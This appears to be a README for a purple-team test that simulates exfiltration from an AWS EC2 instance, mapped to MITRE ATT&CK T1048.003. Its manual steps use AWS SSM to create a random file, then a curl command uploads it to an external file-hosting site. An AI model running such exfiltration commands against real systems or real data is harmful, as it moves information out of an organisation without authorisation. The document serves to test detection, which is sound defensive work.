# Exfil from EC2 to Internet

![Meta TTP](https://img.shields.io/badge/Meta_TTP-blue)

This TTP is executed on your local machine.
Using AWS SSM, commands to generate random file of a given size are sent to EC2 instance.
Again using AWS SSM, command to exfil file to external file upload site are sent.
The output is stored in file `/tmp/exfil_url.txt`

## Arguments

- **aws_region**: The AWS region the EC2 instance is in.
- **ec2_instance_id**: The instance ID of the EC2 to exfiltrate the test file from.
- **generated_exfil_file_path**: The name and full path of the file to be generated and located on the EC2 (Default: /tmp/purple_aws_exfil_test)
- **exfil_file_size_bytes**: Size in bytes of the randomly generated file to create for exfiltrationl (Default: 20 MB)
- **curl_upload_command**: Curl command to be issued to upload the exfil file.

## Steps

1. Set up necessary cloud environment variables
2. Generate a file for exfiltration on the ec2 instance to be exfiltrated.
3. Upload the generated exfil file to the internet. The URL of uploaded file can be found in `tmp/exfil_url.txt`

## Manual Reproduction Steps

```
# Set necessary env variables

# Login to EC2 instance over SSM
aws ssm start-session --target "INSTANCE_ID" --region "REGION"

# Generate a random file to be exfiled.
openssl rand -out /tmp/exfil_file 1000000

#Exfil the file to an external file upload site.
curl https://bashupload.com/ -T /tmp/exfil_file -o /tmp/exfil_url.txt
```

## MITRE ATT&CK Mapping

- **Tactics**:
  - TA0010 Exfiltration
- **Techniques**:
  - T1048 Exfiltration Over Alternative Protocol
- **Sub-Techniques**:
  - T1048.3 Exfiltration Over Unencrypted Non-C2 Protocol
